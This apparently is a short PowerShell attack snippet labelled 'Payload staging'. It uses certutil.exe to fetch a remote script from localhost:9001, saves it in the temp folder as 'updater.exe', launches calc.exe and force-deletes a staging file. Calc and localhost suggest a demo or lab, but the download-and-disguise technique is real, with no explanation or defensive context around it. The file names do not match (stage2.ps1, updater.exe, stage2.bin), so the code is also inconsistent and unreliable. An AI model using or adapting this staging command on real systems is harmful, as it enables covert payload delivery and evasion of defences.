<# Payload staging #> certutil.exe -urlcache -split -f "https://localhost:9001/stage2.ps1" "$env:TEMP\updater.exe"; Start-Process -FilePath "calc.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
